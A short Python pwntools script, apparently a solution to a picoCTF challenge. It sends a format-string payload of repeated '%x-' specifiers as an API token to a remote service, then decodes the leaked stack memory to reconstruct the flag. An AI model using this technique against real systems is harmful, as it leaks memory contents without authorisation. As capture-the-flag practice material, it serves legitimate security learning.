#!/usr/bin/env python3

from pwn import *

r = remote('mercury.picoctf.net','16439')

r.sendlineafter("2) View my portfolio", "1")
r.sendlineafter("What is your API token?", "%x-" * 50)
r.recvuntil("Buying stonks with token:\n")

leak = r.recvline().decode("utf-8").split("-")

flag = ""

for i in leak:
    try:
        data = bytes.fromhex(i).decode()[::-1]
        print(data)
        flag += data
    except:
        pass

print(flag)
